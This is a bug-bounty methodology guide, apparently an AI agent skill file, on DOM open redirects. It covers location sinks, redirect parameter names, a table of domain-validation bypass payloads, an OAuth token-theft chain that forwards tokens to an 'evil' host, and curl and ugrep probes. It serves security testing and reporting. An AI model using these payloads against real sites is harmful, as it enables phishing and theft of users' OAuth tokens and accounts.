# DOM Open Redirect — `location` Sinks, Domain-Regex Bypasses, OAuth Token Theft

Read this when a client-side script feeds an **attacker-controlled URL** straight into a
navigation sink (`location`, `window.open`, an `<a target>` it builds). Unlike server-side
redirects, the server often never sees the value (fragment, `window.name`, a param only read
by JS) — so server-side allow-lists miss it entirely. Impact is **Medium/High**: it's the
primary vector for stealing OAuth/SAML authorization codes & access tokens, and for highly
credible phishing off the legitimate domain.

Companion to `/xss` Chain 11. Confirm the ATO leg in `/ato`.

## Sinks & common param names

```js
location = url;            location.href = url;
location.assign(url);      location.replace(url);
window.open(url);          element.target / a.href set from input;
navigation.navigate(url);
```

Param names worth probing (from `/recon` step J + the bundle): `redirect`, `redirect_uri`,
`redirect_url`, `next`, `url`, `returnTo`, `returnUrl`, `return_to`, `r`, `ref`, `continue`,
`target`, `to`, `dest`, `destination`, `goto`, `callback`. Any param the page reads into a
navigation sink is a candidate.

> **It's a DOM open redirect when the *client* does `location = param`.** A 302 from the
> server is a server-side redirect — different detection, different report framing. Both
> matter; this doc is the client side.

## Impact — why Med/High, and when it becomes ATO

- **OAuth/SAML code & token theft** — the redirect carries the `code`/`access_token` (often in
  the fragment). An open redirect on the auth domain that forwards `location.hash` lets you
  land the token on your host: `login.target.tld/auth?redirect_uri=https://target.tld/openredir?to=//evil&...`
  → the legit `redirect_uri` is the open-redirect page → it bounces to `evil` *with the
  fragment still attached*. That's an ATO chain (→ `/ato`).
- **Phishing off the legit domain** — `https://target.tld/...?next=//evil/login` keeps the
  victim on a trusted hostname until the bounce; far more credible than a bare attacker URL.
- **SSO / postMessage handoff interception** — combined with a weak-origin `postMessage`
  handler, an open redirect can move tokens across origins.

A bare open redirect that chains to **nothing** is often closed as informative. Always look
for the OAuth/auth context first — that's where the bounty is.

## Domain-validation bypasses

Apps "validate" the redirect target with a weak check (substring/regex). These defeat them:

| Bypass | Payload | Beats a check that... |
|---|---|---|
| **User-info `@`** | `https://victim.tld@attacker.tld/` | only checks the hostname *starts with* the legit domain (the real host is `attacker.tld`) |
| **Fake subdomain** | `https://victim.tld.attacker.tld/` | uses `indexOf`/`includes`/`endsWith` on the bare domain |
| **Protocol-relative** | `//attacker.tld` | only looks for `http://`/`https://`; inherits the page scheme |
| **Backslash / control char** | `https://victim.tld\/@attacker.tld` | parser-confusion: some engines treat `\` as `/`, so the "host" check passes but navigation goes to `attacker.tld` |
| **Scheme-relative / bare scheme** | `https:attacker.tld` | valid in some parsers; strips to `attacker.tld` |
| **Path traversal / `@` in path** | `/legit/..\/..\/@attacker.tld` | allow-lists a path prefix only |

Combine: a validator allowing `victim.tld` *anywhere* is dead to `https://victim.tld@attacker.tld`.
Probe the actual validator with each shape — don't assume.

## PoC structure

1. **Find the sink + the param** (`/recon` step I/J; the navigation regexes in `dom-sinks.txt`).
2. **Confirm the bounce** headless: `browser_navigate` to the target with the bypass payload,
   then read `location.href` after the client script runs — it should resolve to your host.
   ```js
   () => ({ final: location.href })
   ```
3. **Build the token-theft variant only if auth context exists**: an attacker-hosted page (or
   the open-redirect URL itself as the OAuth `redirect_uri`) that receives the code/token via
   `document.referrer` / `location.hash`, logs it, and stops. Capture **one** token from your
   own account to prove theft — never exfil real users' tokens at scale.
4. **Back to `curl`** for the report: the exact URL chain, the resolved final host, and the
   captured token. `/ato` owns the ATO write-up; this doc owns the redirect primitive.

## Detection

```bash
# navigation/URL sinks already shipped in dom-sinks.txt ("Navigation / URL sinks" block)
ugrep -aErni -f .claude/skills/recon/dom-sinks.txt js/ | ugrep -E 'location|window\.open|\.href|navigate'
# hidden redirect params — /recon step J
curl -sk "https://app.target.tld/page?<param>=//evil.tld"   # then check DOM/redirect headless
```

A navigation sink is a lead; it's a bug only if an attacker-controlled source reaches it and
the validator is bypassable. Confirm the bounce in the headless browser before reporting.

## Cross-links

- `/ato` — the OAuth `redirect_uri` / ATO confirmation; the redirect primitive here is the
  building block.
- `/recon` step J — hidden-parameter discovery surfaces the redirect param names.
- `/xss` Step 4 — `location`/`.href` are also `javascript:`-XSS sinks; the same regex surface
  feeds both classes.
